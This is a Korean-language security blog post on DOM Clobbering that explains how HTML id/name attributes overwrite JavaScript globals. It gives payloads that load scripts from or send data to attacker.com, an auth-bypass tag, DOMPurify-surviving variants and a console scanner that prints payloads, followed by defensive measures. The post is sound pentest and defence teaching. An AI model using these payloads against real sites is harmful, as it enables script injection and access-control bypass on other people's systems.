---
layout: post
title: title
subtitle: subtitle
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
sidebar:
---
# DOM Clobbering

## HTML 태그 하나로 JavaScript를 흔드는 기법

Apr 28, 2026
 About 9 mins

#XSS #DOM_Clobbering #Sanitizer #Bypass #HTML

---

## Intro

DOM Clobbering은 처음 봤을 때 "이게 왜 되지?" 싶었던 기법입니다. JS도 안 들어가고 그냥 평범한 HTML 태그만 넣었는데, JavaScript 변수가 그 태그로 덮어씌워지면서 로직이 깨지는 현상입니다.

`<script>` 태그가 막혀있는 sanitizer 환경에서도 동작하기 때문에, **DOMPurify가 통과시킨 HTML이 결국 XSS로 이어지는 케이스**의 단골 패턴입니다. 특히 요즘은 클라이언트 측에서 설정값을 `window.config` 같은 전역 변수로 관리하는 SPA가 많아서, DOM Clobbering의 활용 범위가 점점 넓어지는 것 같습니다.

이 글에서는 DOM Clobbering의 원리와 실제 진단에서 자주 쓰는 페이로드, 그리고 Sanitizer 우회 사례를 정리해두려고 합니다.

## DOM Clobbering 이해

### 발생 원리

브라우저는 `id` 또는 `name` 속성을 가진 HTML 요소를 **`window` 객체의 프로퍼티로 자동 등록**합니다. 이게 모든 시작점입니다.

```html
<a id="hello"></a>
```

```javascript
// JS 한 줄도 실행 안했는데 아래 두 개가 가능해짐
console.log(hello);              // <a id="hello">
console.log(window.hello);       // <a id="hello">
```

원래 정의된 변수가 없으면 HTML 요소가 그 자리를 차지하고, **이미 정의된 전역 변수와 같은 이름**의 id를 가진 태그가 들어가면 변수가 덮어씌워질 수 있습니다.

### Source & Sink 조합

```
# Source (공격자가 HTML 삽입 가능한 지점)
- 댓글, 게시글, 프로필 (Stored XSS 차단된 환경)
- Markdown 렌더링 결과
- WYSIWYG 에디터 출력
- DOMPurify 통과한 HTML

# Clobbering 가능 속성
- id="varName"
- name="varName"
- name="varName" (form 내부 input)

# Sink (덮어씌워질 위험 지점)
- window.config, window.settings 같은 전역 객체
- script src 동적 생성 코드 (window.x.src)
- innerHTML, eval, location 등에 변수 참조
```

> 🔥 진단 시 가장 많이 보이는 패턴은 **`window.config.api` 같은 중첩 객체를 동적으로 만드는 코드**입니다. 이런 코드는 form 안에 input 여러 개 넣어서 통째로 덮어쓸 수 있습니다.

## Detect & Exploit

### Detect

#### 타깃 변수 식별

페이지 로드 후 어떤 전역 변수가 있는지 먼저 확인합니다.

```javascript
// DevTools Console에서
Object.keys(window).filter(k => !['document','location',...].includes(k));

// 자주 보이는 타깃 변수명
window.config
window.settings
window.app
window.CSRF_TOKEN
window.user
window.api_url
```

#### 취약 패턴 코드 찾기

```javascript
// 패턴 1: 전역 변수에 의존하는 동적 src 생성
var s = document.createElement('script');
s.src = window.config.api;        // ← 여기 clobbering 가능
document.body.appendChild(s);

// 패턴 2: ||로 fallback 처리
var url = window.defaultURL || '/api/data';
fetch(url);

// 패턴 3: 객체 속성 접근
location.href = config.redirect;

// 패턴 4: innerHTML 동적 할당
document.body.innerHTML = template[id];
```

> ☑️ 페이지의 JS를 grep해서 `window.[a-z]+`, `\|\|`, `config\.`, `settings\.` 같은 패턴 찾으면 후보가 빠르게 나옵니다.

### Exploit

#### 1. 단일 변수 Clobbering

가장 기본 케이스입니다. id 속성으로 전역 변수 생성/덮어쓰기.

```html
<!-- 취약 코드 -->
<script>
  if (!window.isAdmin) { redirect_to_login(); }
</script>

<!-- 페이로드 -->
<a id="isAdmin"></a>
<!-- → window.isAdmin = <a> 요소 (truthy) → 인증 우회 -->
```

#### 2. 중첩 객체 Clobbering (Form 활용)

`window.config.api` 같은 중첩 구조는 `form` + `input` 조합으로 만듭니다.

```html
<!-- 취약 코드 -->
<script>
  var s = document.createElement('script');
  s.src = window.config.api;
  document.body.appendChild(s);
</script>

<!-- 페이로드 -->
<form id="config">
  <input name="api" value="https://attacker.com/x.js">
</form>

<!-- 동작 흐름
1. form id="config" → window.config = <form>
2. input name="api" → form.api → <input>
3. <input>.value 가 toString 시 호출되어 src에 들어감
4. https://attacker.com/x.js 로드
-->
```

#### 3. 더 깊은 중첩 (HTMLCollection 활용)

`window.a.b.c` 처럼 3단 이상은 `<form>` 안에 같은 name을 여러 개 두거나 `<iframe>`을 활용합니다.

```html
<!-- 취약 코드 -->
<script>
  fetch(config.endpoints.user);
</script>

<!-- 페이로드 (HTMLCollection 활용) -->
<form id="config">
  <input name="endpoints">
</form>
<form id="config">
  <input name="endpoints" value="//attacker.com/log">
</form>

<!-- 동작 흐름
1. id="config"인 form 두 개 → window.config = HTMLCollection
2. config.endpoints → 첫 번째 input 또는 두 번째 input
-->
```

```html
<!-- iframe + name 활용 (3단 중첩) -->
<iframe name="config" src="data:text/html,<a id='endpoints' href='//attacker.com/log'></a>"></iframe>

<!-- 동작 흐름
1. iframe name="config" → window.config = iframe의 contentWindow
2. config.endpoints → iframe 내부 <a id="endpoints"> 요소
3. .href 자동 toString → //attacker.com/log
-->
```

> 🔥 [PortSwigger DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) 가 자동으로 clobbering 가능한 변수 + 중첩 깊이를 알려줘서 진단 시 시간 절약됩니다.

#### 4. Anchor Tag로 URL 우회

`<a>` 태그는 `toString()` 시 자동으로 `href` 값을 반환합니다. 이걸 이용해서 URL이 들어가는 sink를 점령합니다.

```html
<!-- 취약 코드 -->
<script>
  var img = new Image();
  img.src = window.banner;        // String이 들어가야 하는 곳
  document.body.appendChild(img);
</script>

<!-- 페이로드 -->
<a id="banner" href="javascript:alert(1)"></a>

<!-- 동작 흐름
1. window.banner = <a> 요소
2. img.src = <a>  → 내부적으로 a.toString() 호출
3. a.toString() → href 값 → "javascript:alert(1)"
-->
```

> ☑️ 단, `img.src`에 `javascript:` 스킴은 최신 브라우저에서 막혀있고, `iframe.src`나 `location.href` 등에서 동작합니다.

#### 5. Document Property Clobbering

`document.cookie`, `document.body` 같은 native 속성도 일부는 clobbering 가능합니다.

```html
<!-- document.cookie를 덮어쓸 수 있는 케이스 (구식 브라우저) -->
<img name="cookie">

<!-- document.body 덮어쓰기 (특정 조건) -->
<form name="body"></form>

<!-- 진단 시 시도해볼 가치 있음 -->
<img name="getElementById">
<a id="getElementById"></a>
<!-- → document.getElementById가 함수 대신 요소로 덮어씌워질 수 있음 -->
```

#### 6. Prototype Pollution과 결합

DOM Clobbering 단독으로 부족할 때 Prototype Pollution과 결합하면 임팩트가 커집니다.

```html
<!-- 일부 라이브러리는 Object.prototype을 통해 옵션 lookup -->
<!-- DOM Clobbering으로 Object.prototype 직접 오염은 불가하지만 -->
<!-- 체이닝 시 사용되는 중간 객체를 점령하는 식으로 활용 -->

<form id="constructor">
  <input name="prototype">
</form>
```

## Sanitizer Bypass 사례

### DOMPurify 통과 페이로드

DOMPurify는 기본 설정에서 **`<form>`, `<input>`, `<a>`, `<iframe>` 같은 태그를 모두 통과**시킵니다. id/name 속성도 허용 목록에 포함되어 있어서 DOM Clobbering 페이로드는 그대로 살아남습니다.

```html
<!-- DOMPurify 기본 설정 통과 (XSS 차단되지만 Clobbering은 통과) -->
<form id="config">
  <input name="api" value="//attacker.com/x.js">
</form>

<a id="defaultURL" href="javascript:alert(1)"></a>

<iframe name="settings" src="data:text/html,<a id='theme' href='//evil.com'></a>"></iframe>
```

> 🔥 DOMPurify를 통과했다고 안심하면 안되는 이유입니다. DOMPurify는 **JS 실행 차단**이 목적이지, **DOM 구조 변경 차단**이 아닙니다.

### SANITIZE_NAMED_PROPS 옵션

DOMPurify 2.4.0부터 `SANITIZE_NAMED_PROPS: true` 옵션이 추가되어 id/name 속성에 prefix를 붙여 clobbering을 차단합니다.

```javascript
// 옵션 적용
DOMPurify.sanitize(input, { SANITIZE_NAMED_PROPS: true });

// 결과
<form id="config">       →  <form id="user-content-config">
<input name="api">       →  <input name="user-content-api">
```

> ☑️ 이 옵션이 **기본값이 아니기** 때문에 적용 안 한 사이트가 훨씬 많습니다. 진단 시 응답에서 id/name 값이 그대로인지 prefix가 붙어있는지 한번 확인해볼 만합니다.

## 진단 시 Quick Checklist

```
1. 페이지 로드 후 console에서 window 전역 변수 식별
   → Object.keys(window) 으로 후보 추출

2. 페이지 JS 파일 다운로드 후 grep
   → grep -E 'window\.\w+|config\.\w+|\|\|' main.js

3. 입력 가능 지점에 ID 기반 단일 페이로드 시도
   → <a id=TARGET></a>

4. 동작하면 중첩 깊이 확인 (form/iframe 결합)
   → <form id=TARGET><input name=SUB></form>

5. 결합 가능 sink 찾기
   → script.src, location, fetch, innerHTML 등에 들어가는 변수

6. DOMPurify 적용 여부 + 옵션 체크
   → 응답에서 user-content- prefix 확인
```

## PoC - DOM Clobbering Scanner

진단 시 페이지 로드 후 자동으로 clobbering 가능한 변수와 sink를 찾아주는 콘솔 스크립트입니다.

```javascript
// DevTools Console에서 실행 (Bookmarklet으로 만들어서 쓰면 편함)
// JavaScript ES2022 / Chromium 기준
(function() {
    console.log("[*] DOM Clobbering Scanner Started");
    console.log("[*] URL: " + location.href);
    
    // 1. window의 사용자 정의 전역 변수 식별
    const builtIns = new Set([
        'window','document','location','navigator','screen','history',
        'console','localStorage','sessionStorage','origin','top','parent',
        'self','frames','length','name','closed','opener','onerror','onload'
    ]);
    
    const userGlobals = Object.keys(window).filter(k => {
        if (builtIns.has(k)) return false;
        if (k.startsWith('webkit') || k.startsWith('chrome')) return false;
        return true;
    });
    
    console.log(`[+] User globals found: ${userGlobals.length}`);
    
    // 2. 각 변수가 HTML 요소인지(이미 clobbered) 또는 일반 객체인지 분류
    const candidates = [];
    let progress = 0;
    
    userGlobals.forEach(key => {
        progress++;
        const val = window[key];
        const type = (val instanceof HTMLElement) ? 'ELEMENT' : 
                     (val instanceof HTMLCollection) ? 'COLLECTION' :
                     typeof val;
        
        // String / Object 타입은 clobbering으로 덮어쓸 가치 있음
        if (type === 'string' || type === 'object' || type === 'undefined') {
            candidates.push({ name: key, type: type, value: val });
        }
        
        if (progress % 20 === 0) {
            console.log(`[Progress] Scanned ${progress}/${userGlobals.length}`);
        }
    });
    
    console.log(`[+] Clobberable candidates: ${candidates.length}`);
    console.table(candidates.slice(0, 30));
    
    // 3. 페이지 JS에서 위험 sink 패턴 추출
    const scripts = document.querySelectorAll('script');
    const sinks = [];
    const sinkPatterns = [
        /(?:window\.)?(\w+)\s*\.\s*src\s*=/g,
        /(?:window\.)?(\w+)\s*\|\|\s*['"]/g,
        /location\s*\.\s*href\s*=\s*(?:window\.)?(\w+)/g,
        /innerHTML\s*=\s*(?:window\.)?(\w+)/g,
        /fetch\s*\(\s*(?:window\.)?(\w+)/g,
    ];
    
    scripts.forEach((s, idx) => {
        const code = s.textContent || '';
        if (!code) return;
        
        sinkPatterns.forEach(pattern => {
            let m;
            while ((m = pattern.exec(code)) !== null) {
                if (!builtIns.has(m[1]) && m[1].length < 30) {
                    sinks.push({
                        variable: m[1],
                        snippet: m[0],
                        scriptIdx: idx
                    });
                }
            }
        });
    });
    
    console.log(`[+] Potential sinks found: ${sinks.length}`);
    console.table(sinks.slice(0, 30));
    
    // 4. clobbering candidate ↔ sink 매칭
    const sinkVars = new Set(sinks.map(s => s.variable));
    const matched = candidates.filter(c => sinkVars.has(c.name));
    
    console.log(`[!] HIGH-VALUE TARGETS (variable + sink match): ${matched.length}`);
    console.table(matched);
    
    // 5. 페이로드 자동 생성
    if (matched.length > 0) {
        console.log("\n[+] Suggested payloads:");
        matched.forEach(t => {
            console.log(`    <a id="${t.name}" href="//attacker.com/x"></a>`);
            console.log(`    <form id="${t.name}"><input name="src" value="//attacker.com/x.js"></form>`);
        });
    }
    
    console.log("[+] Scan complete.");
})();
```

> 🔥 위 스크립트를 Bookmarklet으로 만들어두면 진단 사이트마다 한 번 클릭으로 1차 정찰이 끝납니다. 추후 별도 도구화 포스트로 다뤄볼 예정입니다.

## Security Measures

### 1. 변수 선언 시 명시적 초기화

```javascript
// 위험 (clobbering 가능)
if (window.isAdmin) { ... }

// 안전 (let / const로 선언)
let isAdmin = false;
if (isAdmin) { ... }
```

### 2. typeof로 타입 검증

```javascript
// 위험
var url = window.config.api;
fetch(url);

// 안전 (타입 명시 검증)
if (typeof window.config === 'object' && 
    !(window.config instanceof HTMLElement) &&
    typeof window.config.api === 'string') {
    fetch(window.config.api);
}
```

### 3. Object.create(null) / Map 사용

```javascript
// 위험 (전역 변수 의존)
window.userSettings = { theme: 'dark' };

// 안전 (Map 사용)
const userSettings = new Map();
userSettings.set('theme', 'dark');

// 또는 prototype 체인 끊기
const config = Object.create(null);
config.api = '/api/v1';
```

### 4. DOMPurify SANITIZE_NAMED_PROPS 활성화

```javascript
// 권장 설정
DOMPurify.sanitize(userInput, {
    SANITIZE_NAMED_PROPS: true,        // id/name에 prefix 추가
    SANITIZE_DOM: true,
    FORBID_ATTR: ['id', 'name'],       // 더 보수적이면 아예 차단
});
```

### 5. CSP `script-src` 강화

DOM Clobbering이 결국 외부 script 로드로 이어지는 경우가 많기 때문에, **CSP의 `script-src` nonce + `strict-dynamic`** 적용이 추가 방어선이 됩니다.

```
Content-Security-Policy: 
    script-src 'nonce-{RANDOM}' 'strict-dynamic';
    base-uri 'none';
```

### 6. CSS 활용 차단 (참고)

일부 CSS Selector로 clobbering 페이로드를 시각적으로 식별하거나 차단할 수 있지만, 본질적인 방어는 아니고 모니터링용입니다.

```css
/* 의심 패턴 차단 */
form[id], input[name][value*="//"], a[id][href^="javascript"] {
    display: none !important;
}
```

## References

- [HTML Spec - Named Access on Window](https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object)
- [PortSwigger - DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [HackTricks - DOM Clobbering](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
- [DOMPurify - SANITIZE_NAMED_PROPS](https://github.com/cure53/DOMPurify)
- [Heyes - DOM Clobbering Strikes Back](https://portswigger.net/research/dom-clobbering-strikes-back)
- [Domclob.xyz - Cheat Sheet](https://domclob.xyz/dom_clobbering)

 


 










